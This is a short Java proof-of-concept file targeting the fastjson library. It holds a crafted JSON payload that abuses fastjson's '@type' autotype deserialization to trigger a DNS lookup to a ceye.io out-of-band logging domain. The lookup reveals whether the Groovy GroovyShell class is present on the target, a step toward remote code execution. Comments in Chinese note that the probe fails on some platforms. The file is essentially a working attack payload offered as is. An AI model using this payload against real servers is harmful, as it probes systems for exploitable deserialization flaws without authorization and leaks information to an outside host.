import com.alibaba.fastjson.JSON;

// 无法使用
// 域名中含有特殊字符
// Caused by: java.net.UnknownHostException: {"1":"groovy.lang.groovyshell"}_GV.218BQO.CEYE.IO
//      at java.net.Inet6AddressImpl.lookupAllHostAddr(Native Method)
//
// note: maybe macos will success
//
public class DnsDetectLibrary
{
	private static String poc = "{\n" +
		"    \"@type\":\"java.net.Inet4Address\",\n" +
		"    \"val\":{\n" +
		"        \"@type\":\"java.lang.String\"{\n" +
		"        \"@type\":\"java.util.Locale\",\n" +
		"        \"val\":{\n" +
		"            \"@type\":\"com.alibaba.fastjson.JSONObject\",{\n" +
		"            \"@type\": \"java.lang.String\"\"@type\":\"java.util.Locale\",\n" +
		"            \"language\":{\n" +
		"                \"@type\":\"java.lang.String\"{\n" +
		"                1:{\n" +
		"                    \"@type\":\"java.lang.Class\"," +
		"                    \"val\":\"groovy.lang.GroovyShell\"" +
		"                }\n" +
		"            },\n" +
		"            \"country\":\"gv.218bqo.ceye.io\"\n" +
		"        }\n" +
		"    }\n" +
		"}";

	public static void main( String[] args ) {
		JSON.parseObject(poc);
	}
}
